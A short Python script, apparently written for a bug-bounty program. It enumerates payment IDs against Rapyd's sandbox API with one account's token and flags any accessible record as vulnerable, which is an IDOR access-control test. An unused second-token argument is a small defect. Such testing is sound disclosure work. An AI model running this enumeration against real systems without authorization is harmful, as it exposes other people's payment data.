#!/usr/bin/env python3
"""
Copyright (c) 2025 YOUR_NAME_HERE
Proprietary and Confidential
All Rights Reserved

This software is proprietary and confidential.
Unauthorized copying, modification, or distribution is prohibited.

System ID: BB_20251102_5946
Owner: YOUR_NAME_HERE
"""

import sys, json, requests, os
from datetime import datetime

def test_multiple_payments(token_a, token_b, payment_ids_file):
    with open(payment_ids_file) as f:
        payment_ids = [line.strip() for line in f if line.strip()]
    
    print(f"Testing {len(payment_ids)} payments...")
    results = []
    
    for idx, payment_id in enumerate(payment_ids, 1):
        print(f"\n[{idx}/{len(payment_ids)}] Testing {payment_id}...")
        url = f"https://sandboxapi.rapyd.net/v1/payments/{payment_id}"
        headers_a = {"Authorization": f"Bearer {token_a}", "X-Bugcrowd": "Bugcrowd-DoctorMen"}
        
        try:
            resp = requests.get(url, headers=headers_a, timeout=10)
            vulnerable = resp.status_code == 200
            results.append({"payment_id": payment_id, "vulnerable": vulnerable, "status": resp.status_code})
            print(f"   {'VULN' if vulnerable else 'OK'}: {resp.status_code}")
        except Exception as e:
            print(f"   ERROR: {e}")
            results.append({"payment_id": payment_id, "error": str(e)})
    
    os.makedirs("evidence", exist_ok=True)
    with open(f"evidence/batch_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", "w") as f:
        json.dump(results, f, indent=2)
    
    vuln_count = sum(1 for r in results if r.get("vulnerable"))
    print(f"\nResults: {vuln_count}/{len(results)} vulnerable")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 batch_api_test.py TOKEN_A TOKEN_B PAYMENT_IDS_FILE")
        sys.exit(1)
    test_multiple_payments(sys.argv[1], sys.argv[2], sys.argv[3])
# System ID: BB_20251102_5946
# Owner: YOUR_NAME_HERE
# Build Date: 2025-11-02 02:45:55
